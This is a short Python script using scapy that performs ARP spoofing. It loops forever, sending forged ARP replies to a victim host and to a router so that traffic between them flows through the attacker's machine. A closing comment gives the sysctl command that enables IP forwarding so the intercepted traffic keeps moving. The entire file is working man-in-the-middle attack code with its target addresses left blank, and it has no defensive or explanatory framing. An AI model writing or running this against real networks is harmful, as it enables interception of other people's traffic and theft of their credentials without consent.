import scapy
from scapy.all import *

def spoofVictim(macVictim, ipVictim, ipRouterToSpoof, ourMac):
    print("[+] Creating packet %d and sending to Victim..." % count)
    srp1(Ether(dst=macVictim)/ARP(pdst=ipVictim, psrc=ipRouterToSpoof, hwsrc=ourMac), timeout=2, verbose=0)

def spoofRouter(macRouter, ipRouter, ipVictimToSpoof, ourMac):
    print("[+] Creating packet %d and sending to Router..." % count)
    srp1(Ether(dst=macRouter)/ARP(pdst=ipRouter, psrc=ipVictimToSpoof, hwsrc=ourMac), timeout=2, verbose=0)

conf.iface = "eth0"
count = 1

#spoof data (victim 1)
ipVictim = ""
macVictim = getmacbyip(ipVictim)
ipRouterToSpoof= ""
ourMac = ""

#spoof data (victim 2)
ipRouter = ""
macRouter = getmacbyip(ipRouter) 
ipVictimToSpoof= ""
ourMac = ""

while True:
    spoofVictim(macVictim, ipVictim, ipRouterToSpoof, ourMac)
    spoofRouter(macRouter, ipRouter, ipVictimToSpoof, ourMac)
    count +=1

#to allow the message passthrough, run on bash: sysctl -w net.ipv4.ip_forward=1
